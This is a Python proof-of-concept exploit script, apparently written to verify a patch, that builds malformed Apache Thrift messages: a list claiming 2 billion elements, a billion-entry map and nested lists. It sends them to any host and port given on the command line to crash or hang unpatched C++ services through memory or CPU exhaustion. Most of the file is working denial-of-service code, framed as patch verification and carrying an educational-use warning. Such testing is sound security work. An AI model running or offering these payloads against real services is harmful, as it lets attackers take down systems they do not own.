#!/usr/bin/env python3
"""
TASK_6088 - Proof of Concept: List Resize Bomb Exploit

This script demonstrates the memory exhaustion vulnerability in Apache Thrift
C++ code generator (pre-patch) and verifies the mitigation (post-patch).

SECURITY WARNING: This is a proof-of-concept for educational purposes only.
Use only against systems you own or have explicit permission to test.

Attack Vector: Send a Thrift message claiming a list has 2 billion elements,
               but only send the header (9 bytes) without actual data.

Expected Behavior:
  - Unpatched: Process attempts 64 GB allocation â†’ crash
  - Patched:   SIZE_LIMIT exception thrown â†’ service continues

Author: TASK_6088 Security Team
Date: 2026-02-02
"""

import socket
import struct
import sys
import time
from io import BytesIO

# Thrift protocol constants (from thrift/protocol/TBinaryProtocol.py)
class TType:
    """Thrift type identifiers"""
    STOP   = 0
    VOID   = 1
    BOOL   = 2
    BYTE   = 3
    I08    = 3
    DOUBLE = 4
    I16    = 6
    I32    = 8
    I64    = 10
    STRING = 11
    UTF7   = 11
    STRUCT = 12
    MAP    = 13
    SET    = 14
    LIST   = 15
    UTF8   = 16
    UTF16  = 17


class MaliciousPayloadBuilder:
    """Builds malicious Thrift payloads for vulnerability testing"""

    def __init__(self):
        self.buffer = BytesIO()

    def write_byte(self, value):
        """Write a single byte"""
        self.buffer.write(struct.pack('!b', value))

    def write_i16(self, value):
        """Write a 16-bit integer (big-endian)"""
        self.buffer.write(struct.pack('!h', value))

    def write_i32(self, value):
        """Write a 32-bit integer (big-endian)"""
        self.buffer.write(struct.pack('!i', value))

    def write_i64(self, value):
        """Write a 64-bit integer (big-endian)"""
        self.buffer.write(struct.pack('!q', value))

    def write_string(self, value):
        """Write a string (length + bytes)"""
        encoded = value.encode('utf-8')
        self.write_i32(len(encoded))
        self.buffer.write(encoded)

    def build_resize_bomb(self, list_size=2_000_000_000):
        """
        Build a List Resize Bomb payload

        Creates a Thrift message claiming a list has 'list_size' elements,
        but doesn't actually send the data.

        Args:
            list_size: Number of elements to claim (default: 2 billion)

        Returns:
            bytes: The malicious payload
        """
        # Reset buffer
        self.buffer = BytesIO()

        # Message header (simplified - direct struct write)
        # In real Thrift, there would be a message envelope, but we'll
        # send a raw struct for simplicity

        # Write struct begin (implicit - no wire representation)

        # Field 1: timestamp (i64) - required field
        self.write_byte(TType.I64)           # Field type
        self.write_i16(1)                     # Field ID
        self.write_i64(1234567890)            # Dummy timestamp

        # Field 2: containers (list<MiddleContainer>) - THE ATTACK
        self.write_byte(TType.LIST)          # Field type
        self.write_i16(2)                     # Field ID

        # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        # âš ï¸  MALICIOUS PAYLOAD: Claim list has 2 BILLION elements
        # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        self.write_byte(TType.STRUCT)        # Element type
        self.write_i32(list_size)             # âš ï¸ SIZE: 2 billion!

        # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        # ðŸŽ¯ ATTACK: Don't send any actual data
        # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        # Victim will attempt: resize(2_000_000_000)
        # Memory needed: 2B Ã— 32 bytes = 64 GB
        # Result: std::bad_alloc â†’ CRASH

        # Field stop (end of struct)
        self.write_byte(TType.STOP)

        return self.buffer.getvalue()

    def build_map_bomb(self, map_size=1_000_000_000):
        """
        Build a Map Iteration Bomb payload

        Creates a map claiming to have 'map_size' entries,
        forcing a billion loop iterations.
        """
        self.buffer = BytesIO()

        # Struct with map field
        self.write_byte(TType.I64)
        self.write_i16(1)
        self.write_i64(9999)

        # Map field
        self.write_byte(TType.MAP)
        self.write_i16(3)

        # âš ï¸ MALICIOUS: 1 billion map entries
        self.write_byte(TType.STRING)        # Key type
        self.write_byte(TType.LIST)          # Value type
        self.write_i32(map_size)              # âš ï¸ SIZE: 1 billion!

        # Don't send actual entries

        self.write_byte(TType.STOP)
        return self.buffer.getvalue()

    def build_nested_bomb(self, outer_size=10_000, inner_size=100_000):
        """
        Build a Nested Amplification payload

        Creates nested lists: outer_size Ã— inner_size elements
        Total allocation: outer Ã— inner Ã— struct_size
        """
        self.buffer = BytesIO()

        # Struct with nested list field
        self.write_byte(TType.I32)
        self.write_i16(1)
        self.write_i32(42)

        # Outer list field
        self.write_byte(TType.LIST)
        self.write_i16(2)

        # âš ï¸ Outer list: 10,000 elements
        self.write_byte(TType.LIST)          # Element type: list
        self.write_i32(outer_size)

        # For each outer element, claim huge inner list
        # (We'll send just one to demonstrate)

        # First inner list
        self.write_byte(TType.STRUCT)
        self.write_i32(inner_size)            # âš ï¸ Inner: 100,000 each!

        # Don't send actual data
        # Amplification: 10K Ã— 100K = 1 BILLION allocations!

        self.write_byte(TType.STOP)
        return self.buffer.getvalue()


class ExploitPoC:
    """Proof-of-Concept exploit runner"""

    def __init__(self, host='localhost', port=9090):
        self.host = host
        self.port = port
        self.builder = MaliciousPayloadBuilder()

    def print_banner(self):
        """Print exploit information"""
        print("=" * 70)
        print("  TASK_6088 - Proof of Concept: List Resize Bomb")
        print("=" * 70)
        print()
        print("Target: Apache Thrift C++ Service")
        print(f"Host:   {self.host}:{self.port}")
        print()
        print("âš ï¸  WARNING: Educational purposes only!")
        print("    Use only against systems you own or have permission to test.")
        print()
        print("=" * 70)
        print()

    def print_payload_info(self, payload, attack_type, claimed_size):
        """Print information about the payload"""
        print(f"Attack Type:        {attack_type}")
        print(f"Payload Size:       {len(payload)} bytes")
        print(f"Claimed List Size:  {claimed_size:,} elements")
        print(f"Expected Alloc:     {claimed_size * 32:,} bytes ({claimed_size * 32 / 1024**3:.1f} GB)")
        print(f"Amplification:      {(claimed_size * 32) / len(payload):,.0f}x")
        print()

    def send_payload(self, payload, description="Sending payload"):
        """
        Send malicious payload to target

        Returns:
            tuple: (success, response_data, error_message)
        """
        print(f"[*] {description}...")

        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)  # 5 second timeout

            # Connect to target
            print(f"[*] Connecting to {self.host}:{self.port}...")
            sock.connect((self.host, self.port))
            print("[+] Connected!")

            # Send payload
            print(f"[*] Sending {len(payload)} bytes...")
            sock.sendall(payload)
            print("[+] Payload sent!")

            # Try to receive response
            print("[*] Waiting for response (timeout: 5s)...")
            try:
                response = sock.recv(4096)
                print(f"[+] Received {len(response)} bytes")

                # Check for SIZE_LIMIT exception in response
                if b'SIZE_LIMIT' in response or b'exceeds maximum' in response:
                    print()
                    print("âœ… SUCCESS: Attack was BLOCKED!")
                    print("   Server threw SIZE_LIMIT exception")
                    print("   Service remains available")
                    return (True, response, "Attack blocked by patch")
                else:
                    print()
                    print("âš ï¸  UNEXPECTED: Received response but no SIZE_LIMIT")
                    return (True, response, "Unexpected response")

            except socket.timeout:
                print()
                print("â±ï¸  TIMEOUT: No response received")
                print("   This could indicate:")
                print("   - Unpatched server crashed (bad_alloc)")
                print("   - Server hung during allocation")
                print("   - Network issue")
                return (False, None, "Timeout - possible crash")

            finally:
                sock.close()

        except ConnectionRefusedError:
            print()
            print("âŒ ERROR: Connection refused")
            print("   Service is not running or not accessible")
            return (False, None, "Connection refused")

        except Exception as e:
            print()
            print(f"âŒ ERROR: {type(e).__name__}: {e}")
            return (False, None, str(e))

    def run_resize_bomb(self, list_size=2_000_000_000):
        """Execute the List Resize Bomb attack"""
        print("\n" + "â”€" * 70)
        print("ATTACK 1: List Resize Bomb")
        print("â”€" * 70 + "\n")

        # Build payload
        payload = self.builder.build_resize_bomb(list_size)
        self.print_payload_info(payload, "List Resize Bomb", list_size)

        # Show payload hex dump
        print("Payload Hex Dump (first 64 bytes):")
        print("  " + " ".join(f"{b:02x}" for b in payload[:64]))
        if len(payload) > 64:
            print(f"  ... ({len(payload) - 64} more bytes)")
        print()

        # Explain attack
        print("Attack Mechanics:")
        print("  1. Send Thrift struct with list field")
        print(f"  2. Claim list has {list_size:,} elements")
        print("  3. Don't send actual element data")
        print("  4. Unpatched victim calls: resize(2_000_000_000)")
        print(f"  5. Allocation attempt: {list_size * 32 / 1024**3:.1f} GB")
        print("  6. Result: std::bad_alloc â†’ CRASH")
        print()

        # Send payload
        success, response, message = self.send_payload(payload, "Launching attack")

        # Print result
        print("\n" + "â”€" * 70)
        print("RESULT:")
        print("â”€" * 70)
        if success and "blocked" in message.lower():
            print("âœ… PATCHED: Attack was successfully blocked!")
            print("   The SIZE_LIMIT exception indicates the patch is active.")
            print("   Service remained available and responsive.")
        elif "timeout" in message.lower() or "crash" in message.lower():
            print("âš ï¸  VULNERABLE: Service likely crashed or hung!")
            print("   This indicates the server is UNPATCHED.")
            print("   The service attempted to allocate 64 GB and failed.")
        else:
            print(f"â“ UNKNOWN: {message}")
        print("â”€" * 70 + "\n")

        return success

    def run_map_bomb(self, map_size=1_000_000_000):
        """Execute the Map Iteration Bomb attack"""
        print("\n" + "â”€" * 70)
        print("ATTACK 2: Map Iteration Bomb")
        print("â”€" * 70 + "\n")

        payload = self.builder.build_map_bomb(map_size)

        print(f"Attack Type:        Map Loop DoS")
        print(f"Payload Size:       {len(payload)} bytes")
        print(f"Claimed Map Size:   {map_size:,} entries")
        print(f"Expected CPU:       {map_size * 180 / 1e9:.1f} billion cycles")
        print(f"Expected Time:      ~{map_size * 180 / 3e9:.0f} seconds @ 3 GHz")
        print()

        success, response, message = self.send_payload(payload, "Launching map attack")

        print("\n" + "â”€" * 70)
        print("RESULT:")
        print("â”€" * 70)
        if success and "blocked" in message.lower():
            print("âœ… PATCHED: Map attack was blocked!")
        else:
            print(f"âš ï¸  Status: {message}")
        print("â”€" * 70 + "\n")

        return success

    def run_all_attacks(self):
        """Run all attack scenarios"""
        self.print_banner()

        results = {}

        # Attack 1: List Resize Bomb
        results['resize_bomb'] = self.run_resize_bomb(2_000_000_000)

        # Small delay between attacks
        time.sleep(2)

        # Attack 2: Map Iteration DoS
        results['map_bomb'] = self.run_map_bomb(1_000_000_000)

        # Print summary
        print("\n" + "â•" * 70)
        print("ATTACK SUMMARY")
        print("â•" * 70)
        print()
        for attack, blocked in results.items():
            status = "âœ… BLOCKED" if blocked else "âŒ VULNERABLE"
            print(f"  {attack:20s}: {status}")
        print()
        print("â•" * 70)
        print()

        # Final assessment
        if all(results.values()):
            print("âœ… FINAL ASSESSMENT: Server appears to be PATCHED")
            print("   All attacks were blocked with SIZE_LIMIT exceptions.")
            print("   TASK_6088 security hardening is active.")
        elif not any(results.values()):
            print("âŒ FINAL ASSESSMENT: Server appears to be VULNERABLE")
            print("   No attacks were blocked.")
            print("   URGENT: Apply TASK_6088 patch immediately!")
        else:
            print("âš ï¸  FINAL ASSESSMENT: Mixed results")
            print("   Some attacks blocked, others not.")
            print("   Possible partial patch or configuration issue.")
        print()


def main():
    """Main entry point"""
    # Parse command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-h', '--help']:
            print_help()
            sys.exit(0)
        host = sys.argv[1]
    else:
        host = 'localhost'

    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    else:
        port = 9090

    # Create exploit instance
    exploit = ExploitPoC(host, port)

    # Run all attacks
    try:
        exploit.run_all_attacks()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(1)


def print_help():
    """Print usage information"""
    print("""
TASK_6088 Proof-of-Concept Exploit

Usage:
    python3 exploit_poc.py [host] [port]

Arguments:
    host    Target host (default: localhost)
    port    Target port (default: 9090)

Examples:
    # Test local service
    python3 exploit_poc.py

    # Test remote service
    python3 exploit_poc.py 192.168.1.100 9090

    # Test patched vs unpatched
    python3 exploit_poc.py unpatched.test.local 9090
    python3 exploit_poc.py patched.test.local 9090

Expected Output:
    - Unpatched server: Timeout or crash (vulnerable)
    - Patched server:   SIZE_LIMIT exception (protected)

Security Warning:
    This tool demonstrates real vulnerabilities. Use only against
    systems you own or have explicit permission to test.

More Info:
    See TASK_6088_SECURITY_RISK_ASSESSMENT.md for details.
""")


if __name__ == '__main__':
    main()
